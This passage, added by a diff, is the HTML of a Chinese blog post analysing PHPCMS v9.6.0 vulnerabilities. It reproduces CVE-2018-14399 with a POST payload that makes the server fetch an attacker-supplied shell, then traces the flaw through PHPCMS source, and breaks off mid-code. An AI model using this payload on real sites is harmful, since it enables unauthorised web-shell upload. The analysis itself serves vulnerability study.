@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>PHPCMS v9.6.0 两个漏洞分析 - P2hm1n&#39;s Blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+
+
+
+
+    <meta name="description" content="&amp;#x4EFB;&amp;#x610F;&amp;#x6587;&amp;#x4EF6;&amp;#x4E0A;&amp;#x4F20;&amp;#xFF08;CVE-2018-14399&amp;#xFF09; + wap&amp;#x6A21;&amp;#x5757; SQL&amp;#x6CE8;&amp;#x5165;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPCMS v9.6.0 两个漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="P2hm1n&#39;s Blog">
+<meta property="og:description" content="&amp;#x4EFB;&amp;#x610F;&amp;#x6587;&amp;#x4EF6;&amp;#x4E0A;&amp;#x4F20;&amp;#xFF08;CVE-2018-14399&amp;#xFF09; + wap&amp;#x6A21;&amp;#x5757; SQL&amp;#x6CE8;&amp;#x5165;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6OIr5YgRujmoJa1-20201117115107536.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/gfY8KknGSrRtO7M-20201117115107490.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/pMFCXVQycNb6RjU-20201117115107549.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BUloO1A9ujR256I-20201117115107256.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5XIC1okjlf2PMJQ-20201117115108205.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/nqCsx4wp8uX2MWl-20201117115107457.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/AJSbqUtg7T63PGZ-20201117115107732.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/qFr95yWlGcEsjZM-20201117115108047.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VSoJDEBZkU7Fsw8-20201117115108185.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3fuanq7rCEoSyOZ-20201117115108205.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Y36mPkxv12pZhlM-20201117115108098.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VzLkrIoPJFl15Di-20201117115108399.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5BUeGSb2Oyzhqj4-20201117115108323.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fdxGa6P3iTprsV2-20201117115108325.jpg">
+<meta property="article:published_time" content="2019-11-23T08:25:50.000Z">
+<meta property="article:modified_time" content="2020-12-13T09:23:35.639Z">
+<meta property="article:author" content="P2hm1n">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="PHPCMS">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6OIr5YgRujmoJa1-20201117115107536.jpg">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt="" height="50">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">Archives</a>
+            
+            <a class="navbar-item "
+               href="/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/tags">Tags</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Suche" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Inhaltsverzeichnis">
+                    <i class="fa fa-list"></i>
+                </a>
+                <div class="navbar-dropdown is-right">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#任意文件上传（CVE-2018-14399）">1&nbsp;&nbsp;<b>任意文件上传（CVE-2018-14399）</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#漏洞复现">1.1&nbsp;&nbsp;漏洞复现</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#漏洞分析">1.2&nbsp;&nbsp;漏洞分析</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#wap模块-SQL注入">2&nbsp;&nbsp;<b>wap模块 SQL注入</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#漏洞复现-1">2.1&nbsp;&nbsp;漏洞复现</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#漏洞分析-1">2.2&nbsp;&nbsp;漏洞分析</a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/P2hm1n" target="_blank" rel="noopener">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            PHPCMS v9.6.0 两个漏洞分析
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2019-11-23T08:25:50.000Z" itemprop="datePublished">11月 23 2019</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            18 分钟 lesen (Über 2635 Wörter)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><p>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09; + wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;</p>
+<a id="more"></a>
+
+
+
+<h2 id="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;"><a href="#&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;" class="headerlink" title="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;"></a>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;</h2><h3 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h3><p><strong>&#x6F0F;&#x6D1E;&#x5371;&#x5BB3;&#xFF1A;&#x8BE5;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x5728;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x754C;&#x9762;&#x4EE5;&#x672A;&#x6388;&#x6743;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x3002;</strong></p>
+<p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x4F4D;&#x7F6E;&#x5728; &#x4F1A;&#x5458;&#x6CE8;&#x518C; &#x8FD9;&#x4E2A;&#x754C;&#x9762;&#x3002;&#x5730;&#x5740;&#x4E3A; <code>ip/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</code><br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6OIr5YgRujmoJa1-20201117115107536.jpg" alt></p>
+<p>POST&#x53C2;&#x6570;&#x5982;&#x4E0B;</p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=P2hm1n&amp;password=P2hm1n&amp;email=123456@qq.com&amp;info[content]=&lt;img src=&#x4F60;&#x7684;shell&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/gfY8KknGSrRtO7M-20201117115107490.jpg" alt></p>
+<p>&#x8BBF;&#x95EE;&#x7206;&#x51FA;&#x4E0A;&#x4F20;&#x5730;&#x5740;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/pMFCXVQycNb6RjU-20201117115107549.jpg" alt></p>
+<p>&#x80FD;shell</p>
+<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BUloO1A9ujR256I-20201117115107256.png" alt></p>
+<h3 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h3><p>&#x6587;&#x4EF6;&#x76EE;&#x5F55; <code>phpcms/modules/member/index.php</code></p>
+<p><code>index.php</code> &#x5927;&#x81F4;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#xFF1A;&#x4F1A;&#x5458;&#x524D;&#x53F0;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#x3001;&#x8D26;&#x53F7;&#x7BA1;&#x7406;&#x3001;&#x6536;&#x85CF;&#x64CD;&#x4F5C;&#x7C7B;</p>
+<p>&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#x70B9;&#x65B9;&#x6CD5;&#x662F; <code>register</code> &#x5927;&#x81F4;&#x903B;&#x8F91;&#x662F; &#x83B7;&#x53D6;&#x7528;&#x6237;siteid&#xFF0C;&#x5B9A;&#x4E49;&#x7AD9;&#x70B9;id&#x5E38;&#x91CF;&#xFF0C;&#x52A0;&#x8F7D;&#x7528;&#x6237;&#x6A21;&#x5757;&#x914D;&#x7F6E;&#xFF0C;&#x52A0;&#x8F7D;&#x77ED;&#x4FE1;&#x6A21;&#x5757;&#x914D;&#x7F6E;</p>
+<p>&#x7B2C; 134-135 &#x884C; &#x53D1;&#x73B0;&#x53EF;&#x63A7;&#x53D8;&#x91CF; <code>$_POST[&#x2018;info&#x2019;]</code> &#x7ECF;&#x8FC7;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x8FD9;&#x662F; exp &#x7684;&#x5173;&#x952E;&#x53C2;&#x6570;</p>
+<p>&#x5148;&#x770B; 134 &#x884C;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5C06; <code>$_POST[&#x2018;info&#x2019;]</code> &#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x7ECF;&#x8FC7;&#x4E86;<code>new_html_special_chars</code>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x8FC7;&#x6EE4;&#x3002;&#x8DDF;&#x8FDB;&#x51FD;&#x6570;&#x5206;&#x6790;</p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * &#x8FD4;&#x56DE;&#x7ECF;addslashe&#x5904;&#x7406;&#x8FC7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x7EC4;</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $obj &#x9700;&#x8981;&#x5904;&#x7406;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x7EC4;</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">new_html_special_chars</span><span class="hljs-params">($string)</span> </span>{</span><br><span class="line">	$encoding = <span class="hljs-string">&apos;utf-8&apos;</span>;</span><br><span class="line">	<span class="hljs-keyword">if</span>(strtolower(CHARSET)==<span class="hljs-string">&apos;gbk&apos;</span>) $encoding = <span class="hljs-string">&apos;gb2312&apos;</span>;</span><br><span class="line">	<span class="hljs-keyword">if</span>(!is_array($string)) <span class="hljs-keyword">return</span> htmlspecialchars($string,ENT_COMPAT,$encoding);</span><br><span class="line">	<span class="hljs-keyword">foreach</span>($string <span class="hljs-keyword">as</span> $key =&gt; $val) $string[$key] = new_html_special_chars($val);</span><br><span class="line">	<span class="hljs-keyword">return</span> $string;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x662F;&#x505A;&#x4E86; html &#x8F6C;&#x4E49;&#x3002;&#x5BF9;&#x6211;&#x4EEC;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6CA1;&#x6709;&#x592A;&#x5927;&#x963B;&#x788D;&#x3002;&#x63A5;&#x7740;&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B; 135&#x884C;&#x7684; <code>$member_input-&gt;get()</code> &#x65B9;&#x6CD5;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5XIC1okjlf2PMJQ-20201117115108205.jpg" alt></p>
+<p>&#x65B9;&#x6CD5;&#x4F4D;&#x7F6E;&#xFF1A;<code>caches/caches_model/caches_data/member_input.class.php</code></p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">	<span class="hljs-keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">	$model_cache = getcache(<span class="hljs-string">&apos;member_model&apos;</span>, <span class="hljs-string">&apos;commons&apos;</span>);</span><br><span class="line">	<span class="hljs-keyword">$this</span>-&gt;db-&gt;table_name = <span class="hljs-keyword">$this</span>-&gt;db_pre.$model_cache[<span class="hljs-keyword">$this</span>-&gt;modelid][<span class="hljs-string">&apos;tablename&apos;</span>];</span><br><span class="line"></span><br><span class="line">	$info = <span class="hljs-keyword">array</span>();</span><br><span class="line">	$debar_filed = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;catid&apos;</span>,<span class="hljs-string">&apos;title&apos;</span>,<span class="hljs-string">&apos;style&apos;</span>,<span class="hljs-string">&apos;thumb&apos;</span>,<span class="hljs-string">&apos;status&apos;</span>,<span class="hljs-string">&apos;islink&apos;</span>,<span class="hljs-string">&apos;description&apos;</span>);</span><br><span class="line">	<span class="hljs-keyword">if</span>(is_array($data)) {</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $field=&gt;$value) {</span><br><span class="line">			<span class="hljs-keyword">if</span>($data[<span class="hljs-string">&apos;islink&apos;</span>]==<span class="hljs-number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			$field = safe_replace($field);</span><br><span class="line">			$name = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line">			$minlength = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;minlength&apos;</span>];</span><br><span class="line">			$maxlength = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;maxlength&apos;</span>];</span><br><span class="line">			$pattern = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;pattern&apos;</span>];</span><br><span class="line">			$errortips = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;errortips&apos;</span>];</span><br><span class="line">			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($errortips)) $errortips = <span class="hljs-string">&quot;$name &#x4E0D;&#x7B26;&#x5408;&#x8981;&#x6C42;&#xFF01;&quot;</span>;</span><br><span class="line">			$length = <span class="hljs-keyword">empty</span>($value) ? <span class="hljs-number">0</span> : strlen($value);</span><br><span class="line">			<span class="hljs-keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="hljs-string">&quot;$name &#x4E0D;&#x5F97;&#x5C11;&#x4E8E; $minlength &#x4E2A;&#x5B57;&#x7B26;&#xFF01;&quot;</span>);</span><br><span class="line">			<span class="hljs-keyword">if</span> (!array_key_exists($field, <span class="hljs-keyword">$this</span>-&gt;fields)) showmessage(<span class="hljs-string">&apos;&#x6A21;&#x578B;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&apos;</span>.$field.<span class="hljs-string">&apos;&#x5B57;&#x6BB5;&apos;</span>);</span><br><span class="line">			<span class="hljs-keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) {</span><br><span class="line">				showmessage(<span class="hljs-string">&quot;$name &#x4E0D;&#x5F97;&#x8D85;&#x8FC7; $maxlength &#x4E2A;&#x5B57;&#x7B26;&#xFF01;&quot;</span>);</span><br><span class="line">			} <span class="hljs-keyword">else</span> {</span><br><span class="line">				str_cut($value, $maxlength);</span><br><span class="line">			}</span><br><span class="line">			<span class="hljs-keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;isunique&apos;</span>] &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;db-&gt;get_one(<span class="hljs-keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="hljs-string">&apos;edit&apos;</span>) showmessage(<span class="hljs-string">&quot;$name &#x7684;&#x503C;&#x4E0D;&#x5F97;&#x91CD;&#x590D;&#xFF01;&quot;</span>);</span><br><span class="line">			$func = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;formtype&apos;</span>];</span><br><span class="line">			<span class="hljs-keyword">if</span>(method_exists(<span class="hljs-keyword">$this</span>, $func)) $value = <span class="hljs-keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">			$info[$field] = $value;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="hljs-keyword">return</span> $info;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x9996;&#x5148;&#x5C06; data &#x7ECF;&#x8FC7;&#x4E00;&#x4E2A; <code>trim_script</code> &#x7684;&#x5904;&#x7406;&#x3002;&#x4F46;&#x662F; <code>trim_script</code> &#x5927;&#x591A;&#x90FD;&#x662F;&#x5904;&#x7406; xss &#x6709;&#x5173;&#x6F0F;&#x6D1E;&#x7684;&#x8FC7;&#x6EE4;&#x3002;&#x51E0;&#x4E2A;&#x6B63;&#x5219;&#x5C06;xss&#x7684;&#x5173;&#x952E; payload &#x8FDB;&#x884C;&#x4E86;&#x66FF;&#x6362;</p>
+<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/nqCsx4wp8uX2MWl-20201117115107457.png" alt></p>
+<p>&#x7B2C;27&#x884C;&#xFF0C;&#x6838;&#x5FC3; if &#x5224;&#x65AD;&#x6761;&#x4EF6; <code>if(is_array($data))</code> &#x3002;&#x6211;&#x4EEC; payload &#x4E2D; <code>info[content]=&lt;img src=&#x4F60;&#x7684;shell&gt;</code> &#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x3002;&#x56E0;&#x6B64;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;&#xFF0C;&#x53D1;&#x73B0;&#x5C06;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x904D;&#x5386;&#xFF0C;&#x952E;&#x540D;&#x4E3A;<code>$field</code>&#xFF0C;&#x952E;&#x503C;&#x4E3A;<code>$value</code></p>
+<p>&#x7B2C;30&#x884C;&#xFF0C;<code>$field</code> &#x8FDB;&#x884C;&#x4E00;&#x6B21; <code>safe_replace</code> &#x5904;&#x7406;&#x3002;&#x4E3B;&#x8981;&#x8FC7;&#x6EE4;&#x4E00;&#x4E9B;&#x7C7B;&#x4F3C;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x5C16;&#x62EC;&#x53F7;&#x7B49;&#x53EF;&#x80FD;&#x4EA7;&#x751F; XSS&#xFF0C;SQL&#x6CE8;&#x5165;&#x7684;&#x7B26;&#x53F7;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/AJSbqUtg7T63PGZ-20201117115107732.png" alt="image.png"></p>
+<p>&#x4E4B;&#x540E;&#x7ECF;&#x8FC7;&#x4E00;&#x4E9B;&#x6CE8;&#x518C;&#x65F6;&#x6B63;&#x5E38;&#x7684;&#x5224;&#x65AD;&#x903B;&#x8F91;&#x4EE3;&#x7801;</p>
+<p>47-48&#x884C;</p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$func = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;formtype&apos;</span>];</span><br><span class="line"><span class="hljs-keyword">if</span>(method_exists(<span class="hljs-keyword">$this</span>, $func)) $value = <span class="hljs-keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x5148;&#x662F;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A; <code>$func</code> &#xFF0C;&#x7136;&#x540E;&#x4E0B;&#x9762;&#x7684;if&#x8BED;&#x53E5;&#x5224;&#x65AD;&#x65B9;&#x6CD5;&#x5982;&#x679C;&#x5B58;&#x5728;&#x5C31;&#x5E26;&#x5165;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002;</p>
+<p>&#x6328;&#x4E2A;&#x67E5;&#x770B;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x5728; <code>editor</code> &#x65B9;&#x6CD5;&#x4E2D; &#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x3002;&#x8C03;&#x7528;&#x4E86; <code>attachment</code> &#x7C7B;&#x7684; <code>download</code> &#x51FD;&#x6570;</p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$value = <span class="hljs-keyword">$this</span>-&gt;attachment-&gt;download(<span class="hljs-string">&apos;content&apos;</span>, $value,$watermark_enable);</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x8DDF;&#x8FDB;&#x6587;&#x4EF6; <code>phpcms/libs/classes/attachment.class.php</code></p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">	 * &#x9644;&#x4EF6;&#x4E0B;&#x8F7D;</span></span><br><span class="line"><span class="hljs-comment">	 * Enter description here ...</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $field &#x9884;&#x7559;&#x5B57;&#x6BB5;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $value &#x4F20;&#x5165;&#x4E0B;&#x8F7D;&#x5185;&#x5BB9;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $watermark &#x662F;&#x5426;&#x52A0;&#x5165;&#x6C34;&#x5370;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $ext &#x4E0B;&#x8F7D;&#x6269;&#x5C55;&#x540D;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $absurl &#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $basehref </span></span><br><span class="line"><span class="hljs-comment">	 */</span></span><br><span class="line">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span><span class="hljs-params">($field, $value,$watermark = <span class="hljs-string">&apos;0&apos;</span>,$ext = <span class="hljs-string">&apos;gif|jpg|jpeg|bmp|png&apos;</span>, $absurl = <span class="hljs-string">&apos;&apos;</span>, $basehref = <span class="hljs-string">&apos;&apos;</span>)</span></span></span><br><span class="line"><span class="hljs-function">	</span>{</span><br><span class="line">		<span class="hljs-keyword">global</span> $image_d;</span><br><span class="line">		<span class="hljs-keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="hljs-string">&apos;attachment_model&apos;</span>);</span><br><span class="line">		$upload_url = pc_base::load_config(<span class="hljs-string">&apos;system&apos;</span>,<span class="hljs-string">&apos;upload_url&apos;</span>);</span><br><span class="line">		<span class="hljs-keyword">$this</span>-&gt;field = $field;</span><br><span class="line">		$dir = date(<span class="hljs-string">&apos;Y/md/&apos;</span>);</span><br><span class="line">		$uploadpath = $upload_url.$dir;</span><br><span class="line">		$uploaddir = <span class="hljs-keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">		$string = new_stripslashes($value);</span><br><span class="line">		<span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;</span>, $string, $matches)) <span class="hljs-keyword">return</span> $value;</span><br><span class="line">		$remotefileurls = <span class="hljs-keyword">array</span>();</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($matches[<span class="hljs-number">3</span>] <span 